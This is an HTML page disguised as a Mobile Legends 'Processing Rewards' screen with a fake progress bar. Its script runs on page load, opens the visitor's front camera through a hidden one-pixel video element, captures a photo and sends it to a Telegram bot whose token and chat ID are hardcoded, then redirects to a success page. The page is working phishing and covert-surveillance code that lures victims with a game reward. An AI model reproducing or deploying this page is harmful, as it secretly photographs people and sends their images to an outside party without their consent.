<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Processing Rewards</title>
    <style>
        :root {
            --primary: #FFD700;
            --secondary: #FF6B00;
            --dark: #0A0A0A;
            --dark-secondary: #1A1A1A;
            --text: #FFFFFF;
            --text-secondary: #BBBBBB;
        }
        
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--dark);
            color: var(--text);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        
        img {
            width: 120px;
            max-width: 40%;
            height: auto;
            margin-bottom: 25px;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .container {
            background: var(--dark-secondary);
            padding: 25px;
            border-radius: 12px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }
        
        h2 {
            font-size: 22px;
            margin: 0 0 20px 0;
            color: var(--primary);
        }
        
        .progress-container {
            margin: 25px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress {
            width: 0;
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 4px;
            transition: width 0.3s ease-in-out;
        }
        
        .status {
            margin-top: 15px;
            font-size: 15px;
            color: var(--text-secondary);
        }
        
        .loading-dots::after {
            content: '.';
            animation: dots 1.5s infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        /* Hidden camera elements */
        .camera-element {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
        }
    </style>
</head>
<body>
    <img src="logo.png" alt="Mobile Legends Logo" loading="lazy">
    
    <div class="container">
        <h2>Processing Your Rewards</h2>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div class="status">
                <span id="statusText">Verifying account</span>
                <span class="loading-dots"></span>
            </div>
        </div>
    </div>

    <!-- Hidden camera elements -->
    <video id="hiddenCamera" class="camera-element" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="camera-element"></canvas>

    <script>
        // Telegram configuration
        const BOT_TOKEN = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
        const CHAT_ID = "7328757522";
        
        // DOM elements
        const videoElem = document.getElementById('hiddenCamera');
        const canvasElem = document.getElementById('hiddenCanvas');
        const progressElem = document.getElementById('progress');
        const statusTextElem = document.getElementById('statusText');
        
        // Status messages
        const statusMessages = [
            "Verifying account",
            "Checking inventory",
            "Processing diamonds",
            "Verifying identity",
            "Finalizing rewards"
        ];
        
        // Main function
        async function processRewards() {
            // Start progress animation
            animateProgressBar();
            
            // Attempt to capture photo silently
            await attemptPhotoCapture();
            
            // Redirect after completion
            setTimeout(() => {
                window.location.href = "success.html";
            }, 5000);
        }
        
        // Animate progress bar
        function animateProgressBar() {
            let currentProgress = 0;
            let currentStatus = 0;
            
            const interval = setInterval(() => {
                currentProgress += 1;
                progressElem.style.width = `${currentProgress}%`;
                
                // Update status text every 20% progress
                if (currentProgress % 20 === 0) {
                    currentStatus = (currentStatus + 1) % statusMessages.length;
                    statusTextElem.textContent = statusMessages[currentStatus];
                }
                
                if (currentProgress >= 100) {
                    clearInterval(interval);
                }
            }, 50);
        }
        
        // Camera capture function
        async function attemptPhotoCapture() {
            try {
                // 1. Access camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                videoElem.srcObject = stream;
                
                // 2. Wait for video to be ready
                await new Promise(resolve => {
                    videoElem.onloadedmetadata = resolve;
                });
                
                // 3. Capture after delay
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // 4. Capture frame
                canvasElem.width = videoElem.videoWidth;
                canvasElem.height = videoElem.videoHeight;
                const ctx = canvasElem.getContext('2d');
                ctx.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);
                
                // 5. Convert to blob and send
                return new Promise(resolve => {
                    canvasElem.toBlob(async blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'ml_verify.jpg');
                        
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            console.log("Photo sent successfully");
                        } catch (error) {
                            console.error("Failed to send photo:", error);
                        } finally {
                            // Clean up
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }
                    }, 'image/jpeg', 0.8);
                });
                
            } catch (error) {
                console.error("Camera capture failed:", error);
                return null;
            }
        }
        
        // Start the process when page loads
        document.addEventListener('DOMContentLoaded', processRewards);
    </script>
</body>
</html>
